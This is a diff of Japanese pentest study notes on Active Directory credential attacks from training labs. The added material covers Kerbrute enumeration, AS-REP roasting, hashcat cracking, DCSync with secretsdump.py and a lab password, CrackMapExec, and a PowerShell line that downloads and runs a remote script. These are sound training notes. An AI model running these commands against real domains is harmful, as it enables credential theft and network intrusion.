@@ -176,6 +176,7 @@ https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility
 
   ```bash
   secretsdump.py -sam sam -system system LOCAL
+  secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
   
   -----
   Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -214,22 +215,13 @@ Users guessed are:
  'jen' with password: 'Nexus123!'
 ```
 
-(Github, 2022), https://github.com/Porchetta-Industries/CrackMapExec [↩︎](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/password-attacks#fnref4)
 
-```bash
-kali@kali:~$ cat users.txt
-dave
-jen
-pete
 
-kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
-SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
-SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
-SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
-```
+### Kerbrute
 
 (Github, 2020), https://github.com/ropnop/kerbrute [↩︎](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/password-attacks#fnref6)
+
+#### windowsで実行
 
 ```
 PS C:\Tools> type .\usernames.txt
@@ -254,9 +246,21 @@ Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop
 2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
 ```
 
+#### Linuxで実行
+
+```bash
+./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL xato-net-10-million-usernames.txt --dc 10.129.95.180
+```
+
+* [seclistはここからダウンロード](https://github.com/danielmiessler/SecLists/tree/master/Usernames)
+
+![image-20230502160531198](img/ActiveDirectory_auth/image-20230502160531198.png)
+
+時間がかなりかかる
+
 ### ASREProast
 
-ケルベロス認証のAS(Authentication Service)REQに含まれるクレデンシャルをクラックする
+Kerberosの認証で`PREAUTH`が不要な設定となっているユーザについてクレデンシャル情報を取得できる。windowsの場合はPowerView.ps1を利用して事前に調査することが可能。Linuxはできないので、ユーザリストを作成して実行する。ケルベロス認証のAS(Authentication Service)REQに含まれるクレデンシャルをクラックする
 
 * Linuxで実行
 
@@ -269,6 +273,18 @@ Name  MemberOf  PasswordLastSet             LastLogon                   UAC
 ----  --------  --------------------------  --------------------------  --------
 dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
 ```
+
+もしくは
+
+```bash
+cp /home/kali/Documents/tools/impacket/examples/GetNPUsers.py ./
+
+python GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile TargetUsers.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.129.95.180
+```
+
+![image-20230502162035224](img/ActiveDirectory_auth/image-20230502162035224.png)
+
+※ TargetUsers.txtはkerbruteの結果などを用いて自身で作成する
 
 ```bash
 kali@kali:~$ hashcat --help | grep -i "Kerberos"
@@ -292,6 +308,40 @@ $krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b
 ```
 
 * windowsの場合
+
+Enumeration
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')
+```
+
+domain参加しているマシーンで以下実行
+
+```powershell
+Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
+
+Get-DomainUser victimuser | Convert-FromUACValue
+```
+
+#### ASREPRoast.ps1
+
+*https://github.com/HarmJ0y/ASREPRoast*
+
+```powershell
+Import-Module .\ASREPRoast.ps1
+```
+
+```powershell
+Get-ASRepHash -Domain m0chanAD.local -UserName m0chan
+```
+
+```
+hashcat64.exe -a 0 -m 7500 asrep.hash /wordlists/rockyou.txt
+```
+
+
+
+#### Rubeus.exe
 
 ```powershell
 PS C:\Tools> .\Rubeus.exe asreproast /nowrap
@@ -354,6 +404,14 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5f14c8dd5c3cca94
 
 ```bash
 john --format=krb5tgs crack_file --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+### DCsync(Bloodhoundでユーザが見つかった場合)
+
+linuxから以下コマンドでNTMLを取得できる
+
+```bash
+secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'
 ```
 
 ### DCsync(Exchange Server)
@@ -430,3 +488,41 @@ john --format=krb5tgs crack_file --wordlist=/usr/share/wordlists/rockyou.txt
 
    ![image-20230430114326966](img/ActiveDirectory_auth/image-20230430114326966.png)
 
+
+
+### Crackmapexec
+
+複数のプロトコルでリモートからクレデンシャルの有効性を確認することができるツール
+
+https://github.com/Porchetta-Industries/CrackMapExec
+
+インストール方法
+
+https://wiki.porchetta.industries/getting-started/installation/installation-on-unix
+
+```
+#~ apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
+#~ git clone https://github.com/Porchetta-Industries/CrackMapExec
+#~ cd CrackMapExec
+#~ poetry install
+#~ poetry run crackmapexec
+```
+
+実行方法
+
+```bash
+┌──(kali㉿kali)-[~/Documents/tools/CrackMapExec]
+└─$ poetry run crackmapexec smb 10.129.1.183 -u Finance -p Acc0unting
+```
+
+![image-20230501142701308](img/ActiveDirectory_auth/image-20230501142701308.png)
+
+※ kali標準で入っているものはpython3.11preinstallされているものを参照しに行くのでmodule not found Errorになってしまう
+
+`--share`をつけることで共有ディレクトリを表示可能
+
+```bash
+poetry run crackmapexec smb 10.129.1.183 -u Finance -p Acc0unting --shares
+```
+
+![image-20230501143036328](img/ActiveDirectory_auth/image-20230501143036328.png)
